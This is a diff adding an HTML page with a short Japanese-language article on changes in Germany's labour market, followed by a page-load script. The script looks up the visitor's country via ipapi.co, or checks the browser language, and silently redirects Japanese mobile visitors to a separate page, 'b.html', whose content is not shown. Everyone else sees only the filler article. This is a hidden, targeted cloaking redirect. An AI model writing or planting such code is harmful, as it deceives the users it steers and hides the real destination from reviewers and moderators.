@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ドイツの労働市場の変化</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background: #E44D26;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+        }
+        main {
+            padding: 20px;
+            background: white;
+            max-width: 800px;
+            margin: 20px auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 24px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-top: 20px;
+        }
+        p {
+            line-height: 1.6;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: #E44D26;
+            color: white;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>ドイツの労働市場の変化</h1>
+    </header>
+    <main>
+        <h2>労働市場の重要な変化</h2>
+        <p>ドイツの労働市場は、人口高齢化とスキル不足という課題に直面し、重要な変化を経験しています。</p>
+
+        <h2>政府の移民政策</h2>
+        <p>これらの問題に対処するため、政府は積極的に移民政策を推進し、高度なスキルを持つ人材を市場に呼び込んでいます。</p>
+
+        <h2>言語トレーニングと職業教育</h2>
+        <p>言語トレーニングと職業教育を提供することで、移民がドイツ社会と経済に統合されるのを支援しています。</p>
+
+        <h2>従業員トレーニングの強化</h2>
+        <p>企業はまた、従業員トレーニングを強化し、急速に変化する市場のニーズに適応するために既存の労働者のスキルを向上させています。</p>
+
+        <h2>柔軟な働き方</h2>
+        <p>柔軟な働き方やリモートワークの普及により、労働市場の魅力がさらに高まっています。</p>
+
+        <h2>経済の回復力と競争力</h2>
+        <p>これらの対策は、ドイツ経済の回復力と競争力を高めるのに役立ちます。</p>
+    </main>
+    <footer>
+        <p>&copy; 2025 ドイツの労働市場の変化</p>
+    </footer>
+
+    <script>
+        // Mobile device detection
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
+        }
+
+        // IP and mobile check
+        function checkIPAndDevice() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.country === 'JP' && isMobileDevice()) {
+                        window.location.href = "b.html";
+                        return;
+                    }
+                })
+                .catch(error => {
+                    console.log('IP detection failed:', error);
+                    // Check browser language as fallback
+                    const browserLang = navigator.language || navigator.userLanguage;
+                    if (browserLang.startsWith('ja') && isMobileDevice()) {
+                        window.location.href = "b.html";
+                        return;
+                    }
+                });
+        }
+
+        // Execute check on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            checkIPAndDevice();
+        });
+    </script>
+</body>
+</html>
